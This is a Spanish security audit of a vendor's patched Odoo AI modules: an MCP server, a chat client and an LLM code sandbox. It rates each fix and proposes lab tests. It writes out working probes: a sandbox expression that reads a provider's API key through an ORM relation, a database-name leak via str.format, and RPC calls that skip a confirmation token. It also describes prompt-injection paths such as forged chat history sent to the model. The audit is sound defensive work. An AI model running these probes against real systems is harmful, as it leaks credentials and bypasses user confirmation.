| PNS-36 (parte) | Media | Resuelto, 3.1.839 / 2.1.514 | No se precargan `dbname`/`db_name`/`database` (`controllers/context_builder.py:452-461`). **Resto:** los campos de un `.format` solo se revisan por `_` y dunder (`validators.py:385-402`) y `GuardedSandboxEnv.__getattr__` entrega `cr` (`context_builder.py:104-117`): `'{0.cr.dbname}'.format(env)` devolvería el nombre | **PARCIAL** | «Después» | — | Su check (pedirlo en el chat) sí; añadir el `.format` por `/mcp` |

#### §4.5 Prompt injection y SSRF

| PNS | Grav. | Fabricante | 3.1.879 (archivo:línea) | Resultado | Rama Seges | Comparación | Checks para Seges / reproducible |
|---|---|---|---|---|---|---|---|
| PNS-16 (resto) | Alta | Resuelto, 3.1.832 / 3.1.840 | `[REUSABLE DATA]`/`[REUSABLE QUERY]` con rol `user` y turno no fiable (`utils/engine_turn_messages.py:274-329`); con `open`, confirmar no añade el dominio (`models/safe_operation.py:1136-1138`; `controllers/safe_plan.py:774-776`) | **VERIFICADO** | — | — | Sí (R2a de E1 con `open`; prueba 3 de staging del 16/10) |
| PNS-59 (resto) | Alta | Resuelto, 3.1.840 | `may_show_remote_image` = solo lista blanca `web` (`models/url_whitelist.py:168-175`); `remote_image` sin redirecciones (`utils/remote_image.py:36-40`) | **VERIFICADO** | «Después» (59 con `open`) | — | Sí (prueba 9a del staging del 16/10, ahora con `open`) |
| PNS-17 (resto) | Alta | Resuelto, 3.1.840 | `request_public_http`: salto a salto, host público, tope de tamaño (`utils/fetch_url_safe.py:113-178`), usado por el driver (`lib/api/drivers/openapi_driver.py:92, 406`). **Resto:** al cambiar de host solo se quitan las cabeceras de `_AUTH_HEADER_NAMES` (`fetch_url_safe.py:98-110, 156-159`); la cabecera configurable (`auth_type` `api_key`/`custom_header` con `auth_header_name`, `lib/api/drivers/base.py:47-50`) se reenvía. DNS rebinding sigue (menor) | **PARCIAL** | — | — | Su check (redirección a host interno) sí, con un servidor de prueba; añadir redirección pública con cabecera personalizada |
| PNS-86 | Media | Resuelto, 3.1.840 | `fetch_documentation`: host inicial en lista blanca y `request_public_http` (`services/openapi_spec_generator.py:597-625`) | **VERIFICADO** | «Después» | — | Sí, como AI Administrator con una URL que redirige |
| PNS-54 (parte) | Crítica | Resuelto, 3.1.841 / 2.1.516 | `_confirm_by_user`, `_resolve_*` privados (`models/safe_operation.py:581, 642, 777, 899`); `/verification/confirm` y `/execute` exigen el token (`controllers/verification_ui.py:37-97`), espera de 5 s en `high` (`safe_operation.py:562-571`). **Resto:** tokens nuevos por RPC (`card_payload`, `pending_card_payloads`, públicos: `safe_operation.py:2003-2048`; ruta `/pns_ai_mcp/verification/pending`, `verification_ui.py:142-146`) y `action_confirm_and_execute` / `action_execute_plan` públicos, sin token ni espera (`safe_operation.py:1765-1831`) | **PARCIAL** | «Después» | — | Su check (RPC a `resolve_confirm_and_execute`, `confirm` sin token) sí, pero no demuestra el arreglo: añadir `action_confirm_and_execute` y `/verification/pending` + `confirm` |
| PNS-22 (resto) | Media | Resuelto, 3.1.840 | Puerta por `is_write` del registro antes de ejecutar, salvo `relaxaicode` (`controllers/main.py:1242-1253`). En los tres módulos ninguna herramienta salvo `relaxaicode` declara `is_write=True` (`controllers/tools_relaxaicode.py:56`; el resto `False`) | **VERIFICADO** | — | — | **No** reproducible sin una herramienta de terceros con `is_write=True` |
| PNS-40 (parte) | Media | Resuelto, 3.1.840 | Mensajes genéricos sin endpoint (`utils/engine_tool_loop.py:620-622`; `utils/engine_turn_close.py:181-193`) | **VERIFICADO** (código) | «Después» | — | Sí, con proveedor caído (503); REQUIERE PRUEBA de lo que ve el chat |

### 2.2 Parches de Seges 1 a 12

| Parche | PNS | Comprobación aplicada a 3.1.879 | Resultado | Puntos de entrada (7-12) frente a nuestra corrección |
|---|---|---|---|---|
| 1 | PNS-81 | Genéricos en minúscula en anotaciones sin `from __future__` (Grep): ninguno. `Tuple[bool, Optional[str]]` (`pns_ai_mcp/controllers/mcp_decorators.py:8, 169`) | Corregido, equivalente | — |
| 2 | PNS-81 | `exif_transpose` protegido con `getattr` y alternativa `_stand_up` con las 8 orientaciones (`pns_base/utils/pdf_io.py:94-112`) | Corregido, equivalente (casi idéntico) | — |
| 3 | PNS-81 | `get_source_segment` con `getattr` y `or src` (`pns_ai_mcp/utils/relaxaicode_recipe.py:500-501`); `end_lineno`/`end_col_offset` con `getattr` (`pns_ai_chatboo/models/chatboo_canvas.py:1940-1941`) | Corregido, equivalente | — |
| 4 | PNS-81 | `_get_mcp_env()(su=True)` en `_mcp_prompts_list` y `_mcp_prompts_get` (`pns_ai_mcp/controllers/main.py:1379, 1416, 1447, 1544`); `tool_env` con `try/except AttributeError` (`controllers/controller_helpers.py:177-181`) | Corregido, equivalente | — |
| 5 | PNS-93 | `extra_content` de cada delta copiado al `tool_call` (`pns_ai_mcp/lib/llm/drivers/openai_driver.py:194, 754-756`) | Corregido, equivalente | — |
| 6 | PNS-94 | `rollback` del cursor del hilo antes de cada `_finalize` de `_process` (`pns_ai_chatboo/models/chatboo_async_request.py:302, 477, 493`; método `:544-559`) y pantalla en cursor corto (`:345, 527-538`). `_on_crash` corre en un cursor nuevo después de cerrarse el del turno: no hereda locks (`chatboo_job.py:204-222, 247-250`) | Corregido por código; **REQUIERE PRUEBA** (5 casos) | Distinta: no restaura `towrite`/`tocompute` (nosotros sí) |
| 7 | PNS-90 | Solo `_get_cached`/`_store` (`pns_ai_mcp/models/fetch_cache.py:64, 92`) | Corregido | RPC directo, portal y `/jsonrpc`: equivalente (`call_kw` rechaza `_`). Sandbox: mejor (bloqueo general de `_` en AST y ejecución, no lista de nombres) |
| 8 | PNS-91 | `_ensure_domain_whitelisted` privado (`models/url_whitelist.py:235`) | Corregido | Equivalente en RPC; mejor en sandbox. Cambio funcional con `open` (no amplía la lista) |
| 9 | PNS-85 | Los cuatro privados (`models/ai_skill_param_cache.py:92, 126`; `models/ai_skill.py:354, 363`) y el motor los busca por nombre privado (`utils/engine_skills.py:147, 239`) | Corregido | Equivalente en RPC; mejor en sandbox |
| 10 | PNS-83 | `_redeem_key_pin`, `_consume_key_pin` (`models/mcp_user.py:745, 788`); `_release_all`, `_note_failure`, `_is_blocked` (`models/key_pin_block.py:46, 52, 73`); el botón de Ajustes exige administrador de IA antes del `sudo` (`models/res_config_settings.py:390-395`, `ensure_ai_admin`) | Corregido según el criterio, **con vía nueva** | Equivalente en lo que cubre nuestro parche; **peor en conjunto**: `ai.key.pin.ask.collect_pin` (pública) permite el canje sin límite ni grupo (§3) |
| 11 | PNS-82 | Privados (`pns_ai_chatboo/models/chatboo_session.py:407, 424, 451, 465`); `create_uid` comparado con el **dueño de la sesión** (`:496`), no con el usuario real; `unlink` borra en `sudo` adjuntos de cualquier creador (`:1989-1995`) | **No cumple** el criterio (parte `unlink`) | RPC, portal, `/jsonrpc`: equivalente. Búfer + `request_cancel`: equivalente, y mejor (no se crean jobs por RPC). Borrado de la sesión: peor |
| 12 | PNS-01/02 | No hay `group_system` en `_apply_user_*`; en su lugar `_resolve_group_below_cusp` (`models/ai_system_action.py:700-708`) | **No cumple** el criterio (diseño distinto) | Al proponer y al ejecutar: los dos (preview y apply, `:719-775`). Además, el fabricante cubre la vía CRUD (`safe_plan.py:270-271, 881-940`). Diferencia: nuestro parche exige Ajustes para cualquier grupo; el suyo prohíbe la cúspide a todos y deja libres los demás grupos. Ninguno de los dos cierra M10 (§8.7) |

### 2.3 PNS-97 y PNS-98

| PNS | Grav. | 3.1.879 (archivo:línea) | Resultado | Rama Seges |
|---|---|---|---|---|
| PNS-97 | Media | El AI Administrator mantiene CRUD sobre `ai.trusted.action` (`pns_ai_mcp/security/ir.model.access.csv:74`); el modelo no sobrescribe `create`/`write`/`unlink` (`models/ai_trusted_action.py:28-143`); `_resolve_method` llama por nombre a cualquier método (también privado) de cualquier modelo de `model_id` con los argumentos del plan (`:93-110, 112-129`) | **NO CORREGIDO** | Previsto en E4 |
| PNS-98 | Baja | `fulfill_client_export` crea el adjunto en cursor propio con commit (`utils/session_download.py:365-392`, vía `persist_turn_file`) y lo reclama con el cursor de la petición (`pns_ai_chatboo/models/chatboo_session.py:559-564`; `_claim_turn_file_chips` hace `exists()` y descarta, `:490-492`); la vía de respaldo de `_finalize` escribe el job por SQL y no reclama adjuntos (`models/chatboo_async_request.py:697-715`) | **NO CORREGIDO** (confirmar con prueba) | Sin entrega asignada |

### 2.4 Compatibilidad con Python 3.7.3 / Odoo 14

| Comprobación | Resultado en 3.1.879 |
|---|---|
| Walrus `:=` | Ninguno en código (dos apariciones dentro de expresiones regulares: `pns_ai_mcp/controllers/relaxaicode_repair.py:58, 74`) |
| Parámetros solo posicionales (`/`) | Ninguno |
| f-strings con `=` (`{x=}`) y comillas anidadas iguales (3.12) | Ninguno |
| `functools.cached_property`, `functools.cache`, `@lru_cache` sin paréntesis | Ninguno |
| `math.prod/isqrt/dist/comb/perm`, `statistics.fmean`, `shlex.join`, `importlib.metadata`, `asyncio.to_thread`, `zip(strict=)`, `missing_ok=`, `datetime.UTC`, `itertools.pairwise` | Ninguno |
| `str.removeprefix/removesuffix` | Ninguno |
| `dict \| dict`, `\|=` sobre dict | Ninguno (las 5 apariciones de `\|` con llaves son conjuntos) |
| Genéricos `list[...]`/`dict[...]`/`tuple[...]` en anotaciones evaluadas | Ninguno; `set \| None` en `pns_ai_mcp/utils/response_anti_echo.py:119`, archivo con `from __future__ import annotations` (`:13`) |
| `match`/`case`, `except*`, `with (...)` multilínea | Ninguno |
| `typing` 3.8+ | `get_origin/get_args` con alternativa (`pns_ai_mcp/controllers/mcp_decorators.py:11-15`); `include_extras=True` dentro de `try` (`:90-103`) |
| `zoneinfo` (3.9) | Siempre en `try` con alternativa (`controllers/context_builder.py:375-376`, `utils/user_time.py:17-18`, `pns_ai_chatboo/utils/chatboo_display_time.py:69-70`) |
| `ast.unparse` (3.9) | Siempre en `try/except` (`controllers/validators_repair.py:106, 244, 397`; `validators_sort.py:548`; `utils/relaxaicode_recipe.py:170, 344`): en 3.7 las reparaciones automáticas no se aplican (igual que en 3.1.782) |
| `ast.get_source_segment`, `end_lineno`, `end_col_offset` | Protegidos (parche 3, arriba) |
| `isinstance(..., ast.Constant)` sin `Str` | En `pns_ai_mcp` resuelto con `ast_literal` (`controllers/validators_base.py:285-297`) y tuplas `(ast.Constant, ast.Str)`; `_ast_static_str` también trata `ast.Index` de 3.7 (`validators_checks.py:398-399`). **Queda** `pns_ai_chatboo/utils/skill_capture_compose.py:319-325` (`_static_str` solo `ast.Constant`): en 3.7 no reconoce `env['ai.skill']` y la captura de skills no excluye esas rondas (degradación funcional, sin efecto de seguridad: el sandbox lo sigue rechazando en ejecución). Contradice su test declarado («no hay `isinstance(..., ast.Constant)` a secas») |
| `ET.indent` (3.9) | `try/except AttributeError` (`controllers/formatters.py:283-286`) |
| Pillow 5.4 (`exif_transpose`, `getexif`, `Image.Resampling`, `ImageOps.contain/pad`) | Solo `exif_transpose`, protegido (parche 2) |
| requests 2.21 (`requests.JSONDecodeError`, `Retry(allowed_methods=)`) | Ninguno |
| API de Odoo 16+ (`invalidate_recordset`, `bus._sendone`) | Siempre con alternativa (`pns_base/utils/compat.py:54-59`; `pns_ai_chatboo/models/chatboo_session.py:442-448`; `chatboo_async_request.py:1146-1147, 1608-1610`; `chatboo_canvas_job.py:148-149`) |
| `Environment.sudo()` (no existe en 14) | Corregido (parche 4) |
| Clave `assets` del manifest | Presente en `pns_ai_mcp/__manifest__.py:35`; en 14 se ignora y los assets se cargan con `load_odoo14_assets_if_needed` (`pns_ai_mcp/utils/compat.py:26-40`), como en 3.1.782 |
| `version` sin `14.0.` | Odoo 14 lo antepone (`odoo/modules/module.py:441-445`) |

**Conclusión:** sin fallos al importar ni al ejecutar detectables por lectura; una degradación nueva
(`skill_capture_compose.py`). Confirmación: `odoo-dev 14 paridad` y la batería (fase 3).

## 3. Detalle de PARCIAL, NO CORREGIDO y REQUIERE PRUEBA

### PNS-54 (Crítica) — PARCIAL: el token no protege frente a un script en la página

- **Lo corregido:** los métodos de confirmación del modelo son privados
  (`models/safe_operation.py:581, 642, 777, 899`) y las rutas de la tarjeta exigen el token
  (`controllers/verification_ui.py:37-97`), con espera de 5 s en servidor para `high`
  (`safe_operation.py:562-571`).
- **Resto 1 — el token se obtiene por RPC:** `card_payload(mint_token=True)` es público y no comprueba
  `_can_resolve` (`safe_operation.py:2003-2032`); `pending_card_payloads()` también
  (`:2034-2048`), y la ruta `/pns_ai_mcp/verification/pending` (`verification_ui.py:142-146`) devuelve
  a la sesión un token nuevo de cada operación pendiente suya. Un script inyectado (la amenaza de
  PNS-54) llama a `pending`, espera 5 s y llama a `confirm` y `execute` con ese token.
- **Resto 2 — confirmación sin token:** `action_confirm_and_execute` (y su alias
  `action_execute_plan`) son públicos (`safe_operation.py:1765-1831`): con `_can_resolve` (dueño o AI
  Administrator, `:334-341`) confirman y ejecutan en una sola llamada, sin token ni espera. El
  fabricante lo admite («el botón Confirmar de Autorizaciones sigue siendo el de esa pantalla»), pero
  por RPC no hace falta abrir esa pantalla.
- **Por qué su check no basta:** llamar a `resolve_confirm_and_execute` (que ya no existe) no
  demuestra nada; el equivalente público es `action_confirm_and_execute`.

### PNS-83 (Alta) — PARCIAL: `collect_pin`, canje de PIN público y sin límite

- **Lo corregido:** los métodos que cubría el parche 10 son privados; sin IP se cuenta en `?`
  (`models/key_pin_block.py:20-24`).
- **Resto (nuevo en 3.1.879, no existe en 3.1.782):** `ai.key.pin.ask.collect_pin(pin)` es
  `@api.model` público (`models/key_pin_desk.py:193-201`). Llama a `_collect`, que crea la petición con
  un cursor de superusuario y avisa por el bus a las mesas abiertas (`:203-213`). La pestaña del
  administrador contesta sola: si el PIN es suyo, envía la clave a `/key_pin/supply`
  (`static/src/js/key_pin_desk_v14.js:190-228`), y `collect_pin` la devuelve en claro a quien llamó.
  - No comprueba grupo (cualquier interno o portal por `call_kw`), ni la forma del PIN, ni el bloqueo
    por IP que sí aplica `_redeem_key_pin` (`models/mcp_user.py:757-773`): los fallos no se cuentan.
  - Sin mesa abierta, cada llamada espera 20 s (`ASK_WAIT_SECONDS`, `key_pin_desk.py:21, 214-220`):
    unas pocas llamadas en paralelo ocupan todos los workers. `_redeem_key_pin` lo evita con
    `any_open()` antes de llamar (`mcp_user.py:764-765`).
  - Con el PIN de 8 dígitos por defecto la fuerza bruta no es práctica; el administrador puede bajarlo
    a 4 (`utils/key_pin.py:12-17, 34-39`). Lo que pesa es la denegación de servicio del punto anterior,
    al alcance de cualquier usuario, también portal. Se mantiene la gravedad Alta.
- **Otros públicos (D-3 de E1):** `any_open`, `close`, `notify_changed` (cualquiera puede enviar
  avisos por el bus a los AI Administrator), `touch`, `collect`, `supply`. Los tres últimos reciben un
  registro como argumento (`user.id`, `mcp_user.id`): por RPC con un entero deberían fallar con
  `AttributeError`. **REQUIERE PRUEBA.**

### PNS-19 (Alta) — PARCIAL: modelos de credenciales alcanzables por relaciones

- **Lo corregido:** `_api_key_for_inference` queda fuera por el bloqueo de `_`; `sudo`, `with_user`,
  `env` y similares están bloqueados (`controllers/validators_base.py:262-264`); `env['ai.provider']`,
  `env['ir.config_parameter']`, etc. se rechazan (`validators_base.py:187-209, 405-415`;
  `context_builder.py:83-99`).
- **Resto:** el control está solo en la puerta `env[...]`/`env.get(...)`. Los recordsets que devuelve
  el ORM son los reales, así que se llega a un modelo cerrado recorriendo una relación desde otro
  abierto:
  - `ai.log.provider_id` → `ai.provider` (`models/ai_log.py:172-179`; `ai.log` no está en la lista).
    Para un AI Administrator (lee `api_key`, `groups=pns_ai_mcp.group_ai_admin`,
    `models/ai_provider.py:194-199`), `env['ai.log'].search([...], limit=1).provider_id.api_key`
    devolvería la clave. Es el caso que el fabricante quiere cerrar («an admin's turn may carry injected
    text», `validators_base.py:183-186`).
  - `ai.provider.usage.wizard.provider_id` (`wizard/ai_provider_usage_wizard.py:13`), tampoco en la
    lista.
  - `env.ref('<xmlid>')`: `GuardedSandboxEnv.__getattr__` solo filtra `_` y los atributos de
    privilegio (`context_builder.py:104-117`); `ai.agent` tiene registros con XML ID
    (`data/ai_agent_data.xml`), y de ahí `ai.agent.provider.provider_id` (`models/ai_agent.py:1585-1586`).
  - Su test declarado («todo modelo con relación a uno cerrado también está cerrado») no está en el
    paquete y, por lo visto, no cubre `ai.log`.
- **REQUIERE PRUEBA** (§4, P-19).

### PNS-17 (Alta) — PARCIAL: cabecera de autenticación personalizada en redirecciones

- **Lo corregido:** cada salto se valida (host público, esquema, máximo de saltos, tope de tamaño) y las
  cabeceras de `_AUTH_HEADER_NAMES` se quitan al cambiar de host (`utils/fetch_url_safe.py:113-178`).
- **Resto:** la lista es fija (`authorization`, `cookie`, `proxy-authorization`, `x-api-key`,
  `x-mcp-api-key`, `x-mcp-token`; `:98-101`). Un servidor OpenAPI con `auth_type` `api_key` o
  `custom_header` pone la clave en la cabecera que diga `auth_header_name`
  (`lib/api/drivers/base.py:47-50`), p. ej. `apikey` u `Ocp-Apim-Subscription-Key`. Si la API responde
  con una redirección a otro host público, esa cabecera se reenvía. DNS rebinding entre la comprobación
  y la conexión: sigue (menor, ya anotado en el seguimiento).
- **REQUIERE PRUEBA** con un servidor de prueba que redirija (§4, P-17).

### PNS-07 (Crítica) — PARCIAL: métodos públicos con cursor propio y commit

- **Lo corregido:** ningún atributo con `_` (salvo metadatos) se toca desde el sandbox, ni literal ni
  dinámico (§2.1). Cierra también el alias `f = m._metodo` (D-2 de E1), porque el AST ve el atributo.
- **Resto:** el criterio no cubre métodos **públicos** que escriben fuera de la caja A. Ejemplo:
  `env['chatboo.session'].browse(<sesión propia>).fulfill_client_export(nombre, '', datos_b64, 'pdf')`
  llega a `persist_turn_file`, que crea el adjunto en un cursor propio con commit
  (`utils/session_download.py:365-392`); la escritura posterior en el cursor de solo lectura falla,
  pero el adjunto ya está guardado. `chatboo.session` no está en ninguna lista. Es el punto de E3
  (D-3 de la spec E2).
- **Para la pasada B:** `chatboo.session.sandbox_helpers` (`pns_ai_chatboo/models/chatboo_session.py:818`)
  expone al sandbox funciones del Canvas (`page_html`, `paint_canvas`…) que guardan en cursor propio
  (`:974-1047`) y `canvas_public_url` (`:964`): superficie nueva por diseño.
- **REQUIERE PRUEBA** (§4, P-07).

### PNS-82 (Alta) — PARCIAL: el borrado de la sesión

- **Lo corregido:** la reclamación (§2.2, parche 11). Además, con la ACL `1,0,0,0` de
  `chatboo.async.request` ya no se pueden crear jobs por RPC.
- **Resto:** `unlink` borra en `sudo` todos los adjuntos colgados de la sesión
  (`chatboo_session.py:1989-1995`) antes de que `super().unlink()` compruebe el acceso. Sobre una
  sesión ajena, el `AccessError` deshace la transacción (sin efecto; prueba 5 de E2). Sobre una sesión
  propia, borra también adjuntos de otros creadores que cuelguen de ella: hoy solo por datos anteriores
  a la corrección (prueba 4 bis de E2) o por flujos futuros; el cron de limpieza
  (`_cleanup_old_sessions`, `:2023`) hace lo mismo en `sudo`. Gravedad del resto: Baja.
- **Diferencia de criterio:** el fabricante compara el creador con el **dueño de la sesión**; nosotros,
  con el **usuario real** y además exigimos que la sesión sea suya. Con los métodos privados, el
  efecto es el mismo en los flujos actuales.

### PNS-61 (Media) — PARCIAL: el historial sigue saliendo de lo que escribe el navegador

- `get_model_history` reconstruye desde `messages` (`chatboo_session.py:219-239`), pero `messages` lo
  escribe el propio navegador con `/chatboo/sessions/save` (`controllers/chatboo.py:422-455`:
  `set_messages(messages)` con lo que manda el cliente) y, por ORM, en la sesión propia (regla con
  escritura, `security/security.xml:9-18`). Un script en la página puede guardar turnos inventados (de
  asistente o con `verification_ack`, que pasa siempre el filtro, `:230-232`) y el siguiente turno los
  envía al modelo. No es escalada (la sesión es del propio usuario), pero el objetivo de la ficha («el
  historial lo manda el navegador») no se cumple del todo.
- **REQUIERE PRUEBA** (§4, P-61).

### PNS-36 (Media) — PARCIAL: nombre de la BD por `.format`

- La comprobación de `.format` del AST solo mira `_` y dunder en los campos del literal
  (`controllers/validators.py:385-402`); `cr` y `env` no se revisan ahí. En ejecución, `str.format`
  usa el `getattr` real, y `GuardedSandboxEnv.__getattr__('cr')` devuelve el cursor
  (`context_builder.py:104-117`; `cr` no es atributo de privilegio). `'{0.cr.dbname}'.format(env)`
  devolvería el nombre de la base de datos. Con una cadena construida en ejecución el AST tampoco la
  ve. Solo permite leer cadenas (no llamar métodos).
- **REQUIERE PRUEBA** (§4, P-36).

### PNS-84 (Media) — PARCIAL: PIN y clave en tránsito

- Ver §2.1. El PIN ya no está en `ai.mcp.user`, pero `ai.key.pin.ask` guarda `pin` y `supplied_key`
  durante la espera y los lee cualquier AI Administrator (`security/ir.model.access.csv:81`). `touch`
  envía los PIN pendientes a toda mesa abierta (`models/key_pin_desk.py:111-124`). Si el worker que
  espera muere, la fila con `supplied_key` queda hasta el siguiente `_collect` (`_drop_old`,
  `:177-182`, solo se llama desde `_collect`, `:205`). Con `collect_pin` (PNS-83) cualquier usuario
  puede provocar peticiones.
- **REQUIERE PRUEBA:** la de su check (canje tardío) y la del worker que muere.

### PNS-28 (Media) — VERIFICADO con salvedad (REQUIERE PRUEBA el preflight)

- En Odoo 14, un `OPTIONS` a una ruta con `cors` lo contesta `HttpRequest.dispatch` antes del
  controlador (`odoo/http.py:768-777`), y `Response.set_default` pone
  `Access-Control-Allow-Origin` con el valor de la ruta, `*` (`:1257-1258`). Los manejadores `OPTIONS`
  del fabricante (`controllers/main.py:235-277`) no llegan a ejecutarse en 14. Sin efecto en la
  seguridad: la petición real con `Origin` ajeno responde 403 antes de leer la clave. La afirmación
  «el `OPTIONS` valida igual» es falsa en Odoo 14.

### PNS-60 (Alta) — VERIFICADO por código (prueba recomendada)

- El saneador admite `BUTTON`, `style` local, `id` y cualquier `data-*`
  (`chatboo_formatters.js:122-152, 224-232`). Si el cliente de Chatboo tiene manejadores de clic por
  atributos `data-*` (p. ej. `data-copy`), el HTML del modelo puede activarlos. Inventario y prueba en
  §4 (P-60).

### PNS-40 (Media) — VERIFICADO por código

- Los mensajes de `ProviderConnectionError` no interpolan el endpoint; queda comprobar en el chat que
  ningún otro camino enseña el error del driver (`str(e)`). REQUIERE PRUEBA (P-40).

### Parche 6 / PNS-94 — REQUIERE PRUEBA

- Por código cumple el criterio. `_on_crash` corre en un cursor nuevo después de cerrarse el del
  turno: no hereda locks (`pns_ai_chatboo/models/chatboo_job.py:204-222, 247-250`; detalle en §5.6). No
  se restauran `towrite`/`tocompute` (decisión del fabricante, explicada en su ficha). Queda la prueba de
  los 5 casos (P-6).

### PNS-97 (Media) — NO CORREGIDO

- Igual que en 3.1.782: el AI Administrator puede crear, editar o borrar acciones de confianza
  (`security/ir.model.access.csv:74`) y `ai.trusted.action` no lo impide
  (`models/ai_trusted_action.py:28-143`, sin `create`/`write`/`unlink`). Puede vaciar `group_ids` o
  crear un `code` nuevo que apunte a cualquier método (también privado) de cualquier modelo
  (`_resolve_method`, `:93-110`), llamado con los argumentos que proponga el plan (`:112-129`).
- **Con 3.1.879:** para los grupos, la cúspide está en el método (`_resolve_group_below_cusp`) y no se
  salta editando el registro. Para el resto, el AI Administrator decide qué métodos son «acciones de
  confianza»; el impacto depende de qué métodos de modelo trabajen en `sudo` (inventario en P-97).

### PNS-98 (Baja) — NO CORREGIDO (confirmado en la fase 3)

- PDF/Word: el adjunto se crea y confirma en un cursor aparte (`utils/session_download.py:365-392`,
  desde `persist_turn_file_detail`, `:395-449`) y la reclamación lo busca con el cursor de la petición
  (`pns_ai_chatboo/models/chatboo_session.py:559-564`): `exists()` da `False` (`:490-492`) y el chip
  se descarta de la lista de reclamados, aunque el mensaje se parchea con él (`:565-590`). Sin cambios
  respecto a 3.1.782.
- Clip y SVG: la vía de respaldo de `_finalize` (`chatboo_async_request.py:697-715`) actualiza el job
  por SQL y no reclama los adjuntos del turno. El `savepoint` nuevo (`:664-693`) no cubre el fallo de
  serialización al escribir el job (`:660`, fuera del `savepoint`).
- **Confirmado en la fase 3 (P-6 ampliada, 23/10/2026)** con CSV, SVG y PDF: los adjuntos del clip (dos
  `text/csv`), del SVG en línea (`image/svg+xml`) y del PDF de `fulfill_client_export`
  (`application/pdf`) quedan con `res_model` y `res_id` vacíos. Las imágenes del turno sí quedan
  enlazadas a `chatboo.session`. Detalle: `fase3_lab_pns_ai_3879.md`, parte 2 («Adjuntos nuevos»).

### Compatibilidad — degradación nueva

- `pns_ai_chatboo/utils/skill_capture_compose.py:319-325`: en Python 3.7 `env['ai.skill']` es
  `Subscript(slice=Index(Str))`; `_static_str` no lo reconoce y `_env_model` devuelve `None`. La
  captura de skills no aparta las rondas que consultan catálogos; la skill capturada puede rechazarse
  después en el sandbox. Sin efecto de seguridad.

## 4. Pruebas propuestas para el laboratorio (fase 3)

Entorno: copia de laboratorio con 3.1.879 **fuera del repo** (la decisión N12 la toma Sergio antes de
cargar nada). Carga y actualización con `odoo-dev 14`; antes, `odoo-dev 14 paridad
pns_base,pns_ai_mcp,pns_ai_chatboo` (objetivo: 0 «no se importan»).

### 4.1 Nuestros tests

| Test | Uso con 3.1.879 | Motivo |
|---|---|---|
| `pns_ai_mcp/tests/test_seges_rpc_access.py` | **Adaptar antes de cargar** | Importa `RELAXAICODE_SIDE_EFFECT_METHODS` de `controllers/validators` (ya no se exporta ahí: está en `validators_base.py:233` y sin los nombres privados) (`AgentEngine` sigue en `utils/agent_engine.py:518`). Sin adaptar, el módulo de tests no se importa. Tras adaptar: `test_control_session_ok`, `test_fetch_cache_refused`, `test_url_whitelist_refused`, `test_skill_param_cache_refused`, `test_key_pin_refused`, `test_public_names_gone`, `test_fetch_cache_roundtrip`, `test_execute_fetch_url_*` tal cual; `test_agent_engine_uses_private_names` → leer `utils/engine_skills.py`; `test_whitelist_internal_paths` → política `open` ya no amplía la lista; comprobaciones de lista negra → `blocked_private_attr` |
| `pns_ai_mcp/tests/test_seges_user_groups.py` | Adaptar | El mensaje cambia (cúspide); `test_settings_admin_adds_and_removes` falla por diseño (nadie da `base.group_system` por un plan); `test_registry_edit_does_not_lift_check` y `test_view_actions_unchanged_for_ai_admin` tal cual. Añadir el caso que marca la diferencia: AI Administrator sin Ajustes da y quita un grupo no cúspide |
| `pns_ai_chatboo/tests/test_seges_chatboo_access.py` | **Adaptar antes de cargar** | Misma importación de `RELAXAICODE_SIDE_EFFECT_METHODS`. Tal cual: `test_control_session_ok`, `test_claim_refused_rpc`, `test_flow_methods_refused_rpc`, `test_foreign_download_denied`, `test_own_download_claimed_and_served`, `test_public_names_gone`, `test_no_caller_uses_public_names`, `test_unlink_foreign_session_refused`. Adaptar: `test_staged_buffer_does_not_hijack` y `test_save_to_session_claims_only_own` (crean jobs sin `sudo`; ahora `AccessError`), `test_names_in_denylist`, `test_claim_filters_in_python` (criterio dueño frente a usuario real). **Fallarán por la diferencia real:** `test_unlink_own_session_keeps_foreign` y `test_cron_unlink_sudo_keeps_foreign`. `test_fulfill_client_export_claims_own`: REQUIERE PRUEBA (cursor propio en modo test) |
| Tests del fabricante (`pns_ai_mcp/tests/`, 31 archivos) | Ejecutar | Línea base nueva. Los `unit_tests/` que cita no vienen en el paquete: pedirlos |

### 4.2 Scripts de staging (`pruebas_e1_*`, `pruebas_e2_*`, fuera de este repo)

| Script / prueba | Uso | Cambio necesario |
|---|---|---|
| `pruebas_e1_rpc.py` 1 a 4 y 6 | Tal cual | Ninguno (mismos nombres privados) |
| `pruebas_e1_mcp.py` 5a-5c y R7 | Tal cual | Mensajes de rechazo nuevos («private attribute…») |
| `pruebas_e1_mcp.py` R2a-R2c | Adaptar | Con `open`, confirmar ya no da de alta el dominio; repetir con `whitelist_only` |
| `pruebas_e2_rpc.py` 1, 3 y 5 | Tal cual | — |
| `pruebas_e2_rpc.py` 2 | Adaptar | El job no se puede crear por RPC (ACL `1,0,0,0`): crearlo desde `/chatboo/stream` o como `admin` |
| `prueba4_bis_e2.py` | Tal cual, resultado distinto | En 3.1.879 el adjunto ajeno se borra con la sesión |
| `pruebas_e2_mcp.py` 6-8 | Adaptar | Mensaje de la cúspide; la 8 (grupo no cúspide) pasaría |
| `pruebas_e2_mcp.py` 9 | Tal cual | — |

### 4.3 Pruebas nuevas (de los restos de §3)

| Id | PNS | Prueba | Resultado si está corregido |
|---|---|---|---|
| P-83a | 83 | Interno sin IA y portal: `ai.key.pin.ask.collect_pin('00000000')` por `call_kw` y por `/jsonrpc`, sin mesa abierta (medir el tiempo) y con mesa abierta de un AI Administrator con su lista de claves cargada y un PIN conocido | `AccessError`; hoy se espera que responda (20 s sin mesa; la clave en claro con el PIN correcto) |
| P-83b | 83 | Por RPC: `touch(token, 2)`, `supply(1, 'x', 2)`, `collect(1, 'a', 'b')`, `close('x')`, `notify_changed()`, `any_open()` | Que ninguno tenga efecto; anotar cuáles responden |
| P-54a | 54 | Dueño con una operación `high` pendiente: `/pns_ai_mcp/verification/pending` → token; esperar 5 s; `confirm` + `execute` con ese token, sin abrir la tarjeta | Rechazo; hoy se espera que ejecute |
| P-54b | 54 | Dueño: `call_kw` a `ai.safe.operation.action_confirm_and_execute` sobre su operación | Rechazo; hoy se espera que confirme y ejecute |
| P-19 | 19 | AI Administrator, por `/mcp` con `relaxaicode` (sin LLM): `result = env['ai.log'].search([('provider_id','!=',False)], limit=1).provider_id.api_key`; y `env.ref('<xmlid de un agente>').provider_ids` (comprobar el nombre del campo) | Rechazo; hoy se espera la clave |
| P-07 | 07 | Usuario de chat, por `/mcp`: `fulfill_client_export` sobre su sesión con unos bytes; después `SELECT` de `ir_attachment` | Sin adjunto nuevo; hoy se espera uno huérfano |
